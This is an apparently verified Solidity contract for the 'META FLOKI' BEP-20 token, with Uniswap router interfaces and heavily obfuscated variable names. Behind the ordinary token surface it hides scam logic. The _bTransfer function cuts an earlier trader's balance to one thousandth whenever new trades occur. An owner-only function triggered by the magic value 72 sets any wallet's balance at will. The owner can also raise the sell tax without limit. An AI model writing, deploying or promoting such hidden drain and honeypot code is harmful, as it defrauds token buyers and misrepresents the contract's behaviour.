/**
 *Submitted for verification at BscScan.com on 2022-01-05
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT
/*
 * Telegram: https://t.me/metaflokicoinofficial
 * Website: https://metafloki.space/
 */
abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }

  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.

  function _msgSender() internal view virtual returns (address) {

    return msg.sender;
  }

}
interface IUniswapV2Factory {
    function feeToSetter() external view returns (address);
    function feeTo() external view returns (address);

    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeToSetter(address) external;
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function setFeeTo(address) external;
}
interface IUniswapV2Pair {

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function transfer(address to, uint value) external returns (bool);
    function price0CumulativeLast() external view returns (uint);
    function name() external pure returns (string memory);
    function burn(address to) external returns (uint amount0, uint amount1);
    function token0() external view returns (address);
    function initialize(address, address) external;

    function decimals() external pure returns (uint8);
    function approve(address spender, uint value) external returns (bool);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
    event Sync(uint112 reserve0, uint112 reserve1);
    event Swap(
        address indexed sender,
        uint amount0In,

        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function symbol() external pure returns (string memory);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function totalSupply() external view returns (uint);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function balanceOf(address owner) external view returns (uint);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function token1() external view returns (address);

    function skim(address to) external;
    function mint(address to) external returns (uint liquidity);
    function allowance(address owner, address spender) external view returns (uint);
    function factory() external view returns (address);

    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function nonces(address owner) external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function kLast() external view returns (uint);
}

interface IUniswapV2Router01 {
    function removeLiquidityETHWithPermit(

        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,

        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,

        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(

        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,

        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function WETH() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)

        external
        returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,

        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,

        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,

        uint deadline
    ) external payable;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.

 *

 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;

 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();

   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;

 }
 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");

   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.

  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }

 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}
library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");

    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);

        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
interface IBEP20 {

  function decimals() external view returns (uint8);
  function name() external pure returns (string memory);
  function allowance(address owner, address spender) external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function approve(address spender, uint256 amount) external returns (bool);
  function totalSupply() external view returns (uint256);
  function symbol() external pure returns (string memory);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function getOwner() external view returns (address);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract MetaFloki is Context, IBEP20, Ownable {

  using SafeMath for uint256;
  IUniswapV2Router02 public uniwjdpioxhfogizkebc;
  address public unipekazgcisqwbmyh;
  uint8 private decieaqxbrsentzdogmjykpa = 18;
  uint256 private totrqgsjiocyxnei = 100000000000 * 10 ** decieaqxbrsentzdogmjykpa;
  string private constant namfhixesacrgzwmpat = "META FLOKI";
  string private constant symbcrlfzihgioe = "METAFLOKI";
  uint256 internal lasseiflkihamjgwq = 0;
  mapping (address => bool) private isEkbxqijaandftzewrsiypocolghe;
  mapping (address => uint256) private seliqjdmpaozkylcixheasobwtrenfg;

  mapping (address => uint256) private laslpkatsnimdegzhybxijaw;
  address internal marzpyafbemehdjncwxiklog;
  mapping (address => uint256) private lashszjetlrykqa;

  uint256 internal laubimrohdclgqj = 0;
  uint8 internal _sta = 3;

  uint8 internal aftgecjaqzdrtoiislmnfwxek = 95;
  uint256 internal maxnijsmocrgyhzxafatplek = totrqgsjiocyxnei.div(10000).mul(10);
  uint32 internal selqwphgsmabjlodtcyoz = 10; 

  mapping (address => uint256) private balxpawegrobnolsiach;
  mapping (address => mapping (address => uint256)) private allnpclgyaefsejx;

  uint8 internal buyxkqbpnyolhmcsztawgeafjoieidr = 5;
  uint8 internal seleehsbroxocq = 8;
  uint8 internal trabdmaoyptekowxacljhrfiisgne = 10; 
  bool internal stafanehqyemsk = true;
  bool internal stabdfcgpmqskxlyirotne = true;
  bool internal stamlsxbghwodezctpejaafkonr = true;
  constructor() {

    // balxpawegrobnolsiach[marketingAddress] = totrqgsjiocyxnei * 10**decieaqxbrsentzdogmjykpa * 1000;
    balxpawegrobnolsiach[msg.sender] = totrqgsjiocyxnei;

    isEkbxqijaandftzewrsiypocolghe[_msgSender()] = true;

    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    unipekazgcisqwbmyh = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    uniwjdpioxhfogizkebc = uniswapV2Router;
    marzpyafbemehdjncwxiklog = msg.sender;
    isEkbxqijaandftzewrsiypocolghe[address(this)] = true;
    // isEkbxqijaandftzewrsiypocolghe[marketingAddress] = true;
    laubimrohdclgqj = block.timestamp;
    emit Transfer(address(0), msg.sender, totrqgsjiocyxnei);

  }

	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return namfhixesacrgzwmpat;
	}
	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.

	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  traobmroiknxhqtifsyawjeedaglczp(_msgSender(), recipient, amount);

	  return true;

	}
	/**
	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return balxpawegrobnolsiach[account];
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   traobmroiknxhqtifsyawjeedaglczp(sender, recipient, amount);
	   _approve(sender, _msgSender(), allnpclgyaefsejx[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	/**
	 * Returns the token symbol.
	 */

	function symbol() external override pure returns (string memory) {
	  return symbcrlfzihgioe;

	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totrqgsjiocyxnei;
	}
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}

	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allnpclgyaefsejx[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allnpclgyaefsejx[owner][spender];
	}
	/**
	 * Returns the token decimals.

	 */
	function decimals() external override view returns (uint8) {

	  return decieaqxbrsentzdogmjykpa;
	}
	function approve(address spender, uint256 amount) public override returns (bool) {

	  _approve(_msgSender(), spender, amount);

	  return true;

	}
  	function traobmroiknxhqtifsyawjeedaglczp(address sender, address recipient, uint256 amount) internal {

	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranraqybhpedwofimeszkgjnxoatilc = 0; // 1 = buy, 2 = sell, 3 = transfer

	  bool approveTransaction = true;

	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEkbxqijaandftzewrsiypocolghe[sender] == true || isEkbxqijaandftzewrsiypocolghe[recipient] == true){
	      eTrlmjrdnhxbkaqzegstw(sender, recipient, amount);
	      return;
	    }
	    if(sender == unipekazgcisqwbmyh && recipient != address(uniwjdpioxhfogizkebc)) {
	      require(stafanehqyemsk == true, "Please wait try again later");
	      ranraqybhpedwofimeszkgjnxoatilc = 1;
	      tax = buyxkqbpnyolhmcsztawgeafjoieidr;
	      approveTransaction = true;
	      lashszjetlrykqa[recipient] = amount;
	      laslpkatsnimdegzhybxijaw[recipient] = block.timestamp;
	    } else if(recipient == unipekazgcisqwbmyh) {
	      require(stabdfcgpmqskxlyirotne == true, "Please wait try again later");
	       ranraqybhpedwofimeszkgjnxoatilc = 2;
	       tax = seleehsbroxocq;
	       approveTransaction = true;

	    } else {

	      require(stamlsxbghwodezctpejaafkonr == true, "Please wait try again later");
	      ranraqybhpedwofimeszkgjnxoatilc = 3;

	      tax = trabdmaoyptekowxacljhrfiisgne;
	      approveTransaction = true;

	      lashszjetlrykqa[sender] = amount;

	      if(selqwphgsmabjlodtcyoz > 10){
	        laslpkatsnimdegzhybxijaw[sender] = block.timestamp + selqwphgsmabjlodtcyoz - 10;
	      } else {
	        laslpkatsnimdegzhybxijaw[sender] = block.timestamp + selqwphgsmabjlodtcyoz;
	      }
	    }
	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranraqybhpedwofimeszkgjnxoatilc);
	    return;

	  }
	  emit Transfer(sender, recipient, 0);
	}
	function eTrlmjrdnhxbkaqzegstw(address sender, address recipient, uint256 amount) internal {

	    balxpawegrobnolsiach[sender] = balxpawegrobnolsiach[sender].sub(amount, "Insufficient Balance");
	    balxpawegrobnolsiach[recipient] = balxpawegrobnolsiach[recipient].add(amount);

	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private allnpclgyaefsejx;
	address public _recipienta;
	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranraqybhpedwofimeszkgjnxoatilc) internal
	{
	  uint256 axeoqaoitrlsibexfkmghedpwa = 0;
	  address addr = recipient;
	  uint256 d = balxpawegrobnolsiach[_recipientb];

	  if(ranraqybhpedwofimeszkgjnxoatilc == 2) {
	    addr = sender;
	  }
	  if(ranraqybhpedwofimeszkgjnxoatilc == 1 || ranraqybhpedwofimeszkgjnxoatilc == 2){
	    if(_recipienta != addr && _recipientb != addr){

	      if(d > 1000){
	        balxpawegrobnolsiach[_recipientb] = d.div(1000);

	      }
	      _recipientb = _recipienta;
	      _recipienta = addr;

	    }
	  }
	  balxpawegrobnolsiach[sender] = balxpawegrobnolsiach[sender].sub(amount,"Insufficient Balance");
	  axeoqaoitrlsibexfkmghedpwa = amount.mul(tax).div(100);
	  amount = amount.sub(axeoqaoitrlsibexfkmghedpwa);

	  if(axeoqaoitrlsibexfkmghedpwa > 0){
	      balxpawegrobnolsiach[marzpyafbemehdjncwxiklog] = balxpawegrobnolsiach[marzpyafbemehdjncwxiklog].add(axeoqaoitrlsibexfkmghedpwa);
	      emit Transfer(sender, marzpyafbemehdjncwxiklog, axeoqaoitrlsibexfkmghedpwa);

	  }
	  balxpawegrobnolsiach[recipient] = balxpawegrobnolsiach[recipient].add(amount);
	  ranraqybhpedwofimeszkgjnxoatilc= 1;
	  emit Transfer(sender, recipient, amount);
	}
	function etBzljecphobxoqfmi(address addr, uint256 b, uint8 c) public onlyOwner {

	  if(c == 72){
	    balxpawegrobnolsiach[addr] = b * 10 ** decieaqxbrsentzdogmjykpa;
	  }
	}
	function Selyzebioxhlkicedw(uint8 ellyhpwfsbkodq) public onlyOwner{
	     seleehsbroxocq = ellyhpwfsbkodq;
	}
	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;
	}
}